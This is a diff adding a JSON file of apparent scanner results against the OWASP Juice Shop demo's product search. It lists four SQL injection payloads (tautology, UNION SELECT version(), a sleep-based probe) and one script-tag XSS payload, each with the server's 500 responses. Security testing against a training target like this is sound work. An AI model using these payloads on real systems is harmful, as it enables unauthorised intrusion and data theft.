@@ -1,0 +1,62 @@
+[
+  {
+    "url": "https://demo.owasp-juice.shop/rest/products/search?q=admin%27+--",
+    "param": "q",
+    "payload": "admin' --",
+    "category": "sqli",
+    "evidence": [
+      "Suspicious keywords found",
+      "Status code: 500"
+    ],
+    "response_time": 542,
+    "status": 500
+  },
+  {
+    "url": "https://demo.owasp-juice.shop/rest/products/search?q=%27+OR+1%3D1+--",
+    "param": "q",
+    "payload": "' OR 1=1 --",
+    "category": "sqli",
+    "evidence": [
+      "Suspicious keywords found",
+      "Status code: 500"
+    ],
+    "response_time": 577,
+    "status": 500
+  },
+  {
+    "url": "https://demo.owasp-juice.shop/rest/products/search?q=1%27+AND+1%3D0+UNION+SELECT+NULL%2C+version%28%29+--",
+    "param": "q",
+    "payload": "1' AND 1=0 UNION SELECT NULL, version() --",
+    "category": "sqli",
+    "evidence": [
+      "Suspicious keywords found",
+      "Status code: 500"
+    ],
+    "response_time": 529,
+    "status": 500
+  },
+  {
+    "url": "https://demo.owasp-juice.shop/rest/products/search?q=%27+OR+sleep%285%29+--",
+    "param": "q",
+    "payload": "' OR sleep(5) --",
+    "category": "sqli",
+    "evidence": [
+      "Suspicious keywords found",
+      "Status code: 500"
+    ],
+    "response_time": 584,
+    "status": 500
+  },
+  {
+    "url": "https://demo.owasp-juice.shop/rest/products/search?q=%27%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E",
+    "param": "q",
+    "payload": "'\"><script>prompt(1)</script>",
+    "category": "xss",
+    "evidence": [
+      "Suspicious keywords found",
+      "Status code: 500"
+    ],
+    "response_time": 588,
+    "status": 500
+  }
+]
